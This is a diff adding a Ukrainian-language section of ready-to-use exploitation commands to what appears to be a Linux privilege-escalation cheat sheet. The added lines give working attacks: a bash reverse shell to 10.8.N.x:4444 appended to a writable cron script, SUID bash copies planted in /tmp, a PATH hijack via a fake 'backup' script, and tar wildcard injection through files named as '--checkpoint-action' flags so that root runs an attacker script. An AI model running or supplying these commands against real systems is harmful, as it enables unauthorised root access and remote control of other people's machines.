@@ -32,6 +32,26 @@ ls -la /path/to/cronned_script.sh
 find / -writable -name '*.sh' 2>/dev/null
 ```
 
+## Готові команди експлуатації
+```bash
+# 1) cron-скрипт доступний на запис → дописати reverse shell (спрацює від власника cron):
+echo 'bash -i >& /dev/tcp/10.8.N.x/4444 0>&1' >> /path/cronned.sh
+#    або SUID-копію bash, якщо cron від root:
+echo 'cp /bin/bash /tmp/b; chmod +s /tmp/b' >> /path/cronned.sh   # потім: /tmp/b -p
+
+# 2) PATH hijack: cron викликає команду без повного шляху (напр. "backup"), а
+#    записувана тека стоїть першою в PATH cron → підкласти свій "backup":
+printf '#!/bin/sh\ncp /bin/bash /tmp/b; chmod +s /tmp/b\n' > /writable/backup
+chmod +x /writable/backup
+
+# 3) tar wildcard injection: cron від root робить `tar czf bk.tgz *` у записуваній теці:
+cd /writable_dir
+printf '#!/bin/sh\ncp /bin/bash /tmp/b; chmod +s /tmp/b\n' > runme.sh; chmod +x runme.sh
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh runme.sh'
+#    tar сприйме ці імена як прапорці → виконає runme.sh від root
+```
+
 ## Процеси / сервіси
 ```bash
 ps aux                       # хто що запустив (паролі в аргументах!)
